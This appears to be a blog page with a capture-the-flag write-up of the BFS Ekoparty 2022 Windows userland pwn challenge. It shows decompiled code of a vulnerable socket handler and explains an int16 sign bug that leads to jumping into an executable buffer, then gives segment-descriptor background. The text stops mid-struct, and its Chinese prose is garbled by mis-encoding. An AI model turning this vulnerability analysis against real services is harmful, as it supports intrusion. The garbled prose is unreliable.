<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>BFS-Ekoparty2022-windows-pwn - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
Windows userland PWN
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="BFS-Ekoparty2022-windows-pwn" />
<meta property="og:description" content="
Windows userland PWN
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/bfs-ekoparty2022-windows-pwn/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-08-04T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-08-04T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BFS-Ekoparty2022-windows-pwn"/>
<meta name="twitter:description" content="
Windows userland PWN
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">BFS-Ekoparty2022-windows-pwn</h1>
			<div class="meta">Posted on Aug 4, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>Windows userland PWN</p>
</blockquote>
<p>åœ¨é€›è®ºå›æ—¶å‘ç°ä¸€ä¸ªLinux kernelçš„pwné¢˜ç›®ï¼ŒåŒæ—¶è¿˜æœ‰ä¸€ä¸ªWindowsï¼Œæœ¬æ¥ä»¥ä¸ºä¹Ÿæ˜¯å†…æ ¸æ€ï¼Œä¸‹è½½åå‘ç°æ˜¯ç”¨æˆ·æ€ï¼Œç ”ç©¶ä¸€ä¸‹</p>
<p>ç½‘å€ï¼š<a href="https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/">BFS Ekoparty 2022 Exploitation Challenges</a>çœŸå¥½ï¼Œè¿˜èƒ½ç›´æ¥å‘offerğŸ˜­</p>
<h2 id="eko">eko</h2>
<p>å¼¹å‡ºè®¡ç®—æœºå°±ç®—æˆåŠŸï¼Œä¸èƒ½ä½¿ç”¨é¢å¤–çš„åº“ã€‚</p>
<ul>
<li>åœ¨æœ¬æœºwin11 24h2è¿›è¡Œè°ƒè¯•</li>
</ul>
<p>winchecksec</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-pwsh" data-lang="pwsh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">bfs-eko2022</span> â¯ winchecksec .\<span style="color:#8be9fd;font-style:italic">bfs-eko2022</span>.exe
</span></span><span style="display:flex;"><span>Warn: No load config <span style="color:#ff79c6">in</span> the PE
</span></span><span style="display:flex;"><span>Results <span style="color:#ff79c6">for</span>: .\<span style="color:#8be9fd;font-style:italic">bfs-eko2022</span>.exe
</span></span><span style="display:flex;"><span>Dynamic Base    : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>ASLR            : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>High Entropy VA : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>Force Integrity : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>Isolation       : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>NX              : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>SEH             : <span style="color:#f1fa8c">&#34;Present&#34;</span>
</span></span><span style="display:flex;"><span>CFG             : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>RFG             : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>SafeSEH         : <span style="color:#f1fa8c">&#34;NotApplicable&#34;</span>
</span></span><span style="display:flex;"><span>GS              : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>Authenticode    : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span><span style="display:flex;"><span>.NET            : <span style="color:#f1fa8c">&#34;NotPresent&#34;</span>
</span></span></code></pre></div><p>x64dbg æ’ä»¶ï¼š<a href="https://github.com/klks/checksec">checksec: x64dbg plugin to check security settings</a>ï¼Œå¯ä»¥çœ‹ç›¸å…³dllçš„ä¿æŠ¤ã€‚</p>
<p>æ²¡æœ‰GSä¿æŠ¤ï¼Ÿä½†æ˜¯ä½¿ç”¨IDAæ‰“å¼€</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">0000000140001474</span>                 mov     rcx, [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0F</span><span style="color:#bd93f9">68</span>h<span style="color:#ff79c6">+</span>var_18]
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">000000014000147</span>C                 xor     rcx, rsp        ; StackCookie
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">000000014000147F</span>                 call    __security_check_cookie
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">00000001400014</span><span style="color:#bd93f9">84</span>                 add     rsp, <span style="color:#bd93f9">0F</span><span style="color:#bd93f9">68</span>h
</span></span><span style="display:flex;"><span>.<span style="color:#8be9fd;font-style:italic">text</span>:<span style="color:#bd93f9">00000001400014</span><span style="color:#bd93f9">8</span>B                 retn
</span></span></code></pre></div><p>åˆ›å»ºä¸€ä¸ªsocketï¼Œæ¥æ”¶æ¶ˆæ¯: <code>0.0.0.0:31415</code></p>
<p>æ¥æ”¶0x1000é•¿åº¦çš„æ¶ˆæ¯ï¼Œæ¥æ”¶æ¡æ‰‹æ¶ˆæ¯<code>Hello</code>ï¼Œå‘é€ <code>Hi</code></p>
<p>ç„¶åè¿›å…¥ä¸€ä¸ªå¤„ç†å‡½æ•°</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_140001240</span>(SOCKET a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> result; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v2; <span style="color:#6272a4">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-F48h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> len; <span style="color:#6272a4">// [rsp+24h] [rbp-F44h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> lena; <span style="color:#6272a4">// [rsp+24h] [rbp-F44h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  CHAR CmdLine[<span style="color:#bd93f9">3840</span>]; <span style="color:#6272a4">// [rsp+30h] [rbp-F38h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v7; <span style="color:#6272a4">// [rsp+F30h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">11</span>]; <span style="color:#6272a4">// [rsp+F40h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x1000</span>; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">16</span> )            <span style="color:#6272a4">// åˆå§‹åŒ–buf
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;::</span>buf[i] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x5050505050505050</span>i64;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;::</span>buf[i <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xCF58585858585858u</span>i64;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34; [+] Processing request</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  len <span style="color:#ff79c6">=</span> recv(a1, buf, <span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0</span>);                   <span style="color:#6272a4">// æ¥æ”¶cookie
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> ( len <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Client data error</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( len <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0xBu</span>i64 )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Bad size</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)buf <span style="color:#ff79c6">!=</span> &#39;<span style="color:#bd93f9">2202</span>okE&#39; )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Wrong cookie value</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> buf[<span style="color:#bd93f9">8</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( buf[<span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;T&#39;</span> )                          <span style="color:#6272a4">// type
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Invalid packet type</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">__int16</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>buf[<span style="color:#bd93f9">9</span>] <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0xF00</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> printf(<span style="color:#f1fa8c">&#34;  [-] Invalid packet size</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  lena <span style="color:#ff79c6">=</span> recv(a1, <span style="color:#ff79c6">::</span>buf, <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>buf[<span style="color:#bd93f9">9</span>], <span style="color:#bd93f9">0</span>);<span style="color:#6272a4">// int16 -&gt; uint16 å°å˜å¤§
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  printf(<span style="color:#f1fa8c">&#34; [+] Data received: %i bytes</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, lena);
</span></span><span style="display:flex;"><span>  sub_1400011B0(CmdLine, <span style="color:#ff79c6">::</span>buf, lena);          <span style="color:#6272a4">// å†…å­˜copy
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;T&#39;</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;  [+] Message received: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, CmdLine);
</span></span><span style="display:flex;"><span>    send(a1, CmdLine, lena, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;  [-] Unsupported message</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#ff79c6">=</span> strlen(Str);
</span></span><span style="display:flex;"><span>    send(a1, aUnsupportedMes_1, v2 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> v7;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;X&#39;</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    off_14000C000 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD))<span style="color:#ff79c6">&amp;::</span>buf[lena];
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> off_14000C000(CmdLine);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å†…å­˜copyå‡½æ•°ï¼ŒæŸäº›å­—ç¬¦åœ¨copyæ—¶ä¼šè¢«æ›¿æ¢ä¸º0ã€‚ï¼ˆçœ‹åˆ°åé¢å‘ç°è¿™æ˜¯ä¸€ä¸ªæç¤ºï¼Ÿ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_7FF736B511B0</span>(_BYTE <span style="color:#ff79c6">*</span>a1, _BYTE <span style="color:#ff79c6">*</span>a2, <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+0h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; ; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> a3;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( i <span style="color:#ff79c6">&gt;=</span> a3 )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>a2 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x2B</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">*</span>a2 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x33</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>a1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>a1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>a2;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">++</span>a2;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">++</span>a1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>int16 -&gt; unsigned int16 å¯ä»¥æ˜¯è´Ÿæ•°è½¬åŒ–åå˜ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ï¼Œè¿™æ ·å¯ä»¥è¯»çš„ç¼“å†²åŒºå°±å¾ˆå¤§äº†ã€‚</p>
<p>å¯ä»¥ä¿®æ”¹ v7 ä¸º <code>X</code>ï¼Œä½†æ˜¯ä¸èƒ½å¤ªé•¿ï¼Œå› ä¸ºå­˜åœ¨GSä¿æŠ¤ã€‚</p>
<p>æœ€åæ‰§è¡Œè¿™ä¸ªå‡½æ•°</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ( v7 <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;X&#39;</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    off_14000C000 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD))<span style="color:#ff79c6">&amp;::</span>buf[lena];
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">off_14000C000</span>(CmdLine);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>è¿™ä¸ªä¸€ä¸ªvirtualAllocçš„åŒºåŸŸ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>buf <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)VirtualAlloc((LPVOID)<span style="color:#bd93f9">0x10000000</span>, <span style="color:#bd93f9">0x1000u</span>i64, <span style="color:#bd93f9">0x3000u</span>, <span style="color:#bd93f9">0x40u</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LPVOID <span style="color:#50fa7b">VirtualAlloc</span>(
</span></span><span style="display:flex;"><span>  [in, optional] LPVOID lpAddress,
</span></span><span style="display:flex;"><span>  [in]           SIZE_T dwSize,
</span></span><span style="display:flex;"><span>  [in]           DWORD  flAllocationType,
</span></span><span style="display:flex;"><span>  [in]           DWORD  flProtect
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>æœ€åä¸€ä¸ªå±æ€§ï¼š0x40ä»£è¡¨ <strong>PAGE_EXECUTE_READWRITE</strong> è¡¨æ˜è¿™ç‰‡åŒºåŸŸå¯æ‰§è¡Œã€‚å› æ­¤æœ€åæ˜¯è·³è½¬åˆ°æˆ‘ä»¬è¾“å…¥çš„shellcodeæ‰§è¡Œã€‚</p>
<p>åˆå§‹åŒ–çš„æ—¶å€™ï¼Œå†™äº†æ•°æ®ï¼Œåç¼–è¯‘å</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000000</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000001</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000002</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000003</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000004</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000005</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000006</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">0000000010000007</span>                 push    rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span><span style="color:#bd93f9">8</span>                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span><span style="color:#bd93f9">9</span>                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>A                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>B                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>C                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>D                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000</span>E                 pop     rax
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">debug033</span>:<span style="color:#bd93f9">000000001000000F</span>                 iret
</span></span></code></pre></div><p>æ— è®ºå¦‚ä½•æœ€åè¿˜æ˜¯å¾—æ‰§è¡Œè¿™ä¸€æ®µä»£ç ä¸­çš„æŸäº›éƒ¨åˆ†</p>
<p>iret çš„ä½œç”¨ï¼šIRET(interrupt return)ä¸­æ–­è¿”å›ï¼Œä¸­æ–­æœåŠ¡ç¨‹åºçš„æœ€åä¸€æ¡æŒ‡ä»¤ã€‚IRETæŒ‡ä»¤å°†æ¨å…¥å †æ ˆçš„æ®µåœ°å€å’Œåç§»åœ°å€å¼¹å‡ºï¼Œä½¿ç¨‹åºè¿”å›åˆ°åŸæ¥å‘ç”Ÿä¸­æ–­çš„åœ°æ–¹ã€‚ç›¸å½“äº<strong>POP <code>RIP|CS|RFLAGS|SP|SS</code></strong></p>
<p>è¿™é‡Œä¸»è¦æ˜¯æ®µå¯„å­˜å™¨çš„å¤„ç†ï¼Œå› ä¸ºä¸å¯»å€æœ‰å…³ã€‚åœ¨ real mode ä¸‹ <code>cs:ip = cs &lt;&lt; 4 + ip</code></p>
<p>ä½†æ˜¯åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹æ®µå¯„å­˜å™¨ä¾ç„¶æ˜¯16ä½ï¼Œä½†æ˜¯æ„ä¹‰å¤§ä¸ä¸€æ ·ã€‚å‚è€ƒï¼š<a href="https://utopianfuture.github.io/X86/Segment-data-structure.html">æ®µå¼ç®¡ç†çš„æ•°æ®ç»“æ„</a></p>
<p>GDTRä¿å­˜GDTçš„ç›¸å…³ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯GDTè¡¨çš„èµ·å§‹åœ°å€å’Œå¤§å°</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint16_t</span> limit;    <span style="color:#6272a4">// GDT æœ€å¤§é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint64_t</span> base;     <span style="color:#6272a4">// GDT åŸºåœ°å€ï¼Œåœ¨x86ä¸‹æ˜¯ uint32_t
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>} GDTR;
</span></span></code></pre></div><p>GDTè¡¨ä¸­çš„å†…å®¹ï¼šæ®µæè¿°ç¬¦ï¼Œè®°å½•æ®µçš„ä¿¡æ¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint16_t</span> limit_low;         <span style="color:#6272a4">// æ®µé™ç•Œ 0-15 bits (Segment Limit)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint16_t</span> base_low;          <span style="color:#6272a4">// åŸºåœ°å€ 0-15 bits (Base Address)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  base_mid;          <span style="color:#6272a4">// åŸºåœ°å€ 16-23 bits (Base Address)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">type</span> : <span style="color:#bd93f9">4</span>;          <span style="color:#6272a4">// æ®µç±»å‹ (Segment Type)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">s</span> : <span style="color:#bd93f9">1</span>;             <span style="color:#6272a4">// æè¿°ç¬¦ç±»å‹ (Descriptor Type, 0=system, 1=code or data)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">uint8_t</span>  <span style="color:#8be9fd;font-style:italic">dpl</span> : <span style="color:#bd93f9">2</span>;           <span style="color:#6272a4">// æè¿°ç¬¦ç‰¹æƒçº§åˆ« (Descriptor Privilege Level)
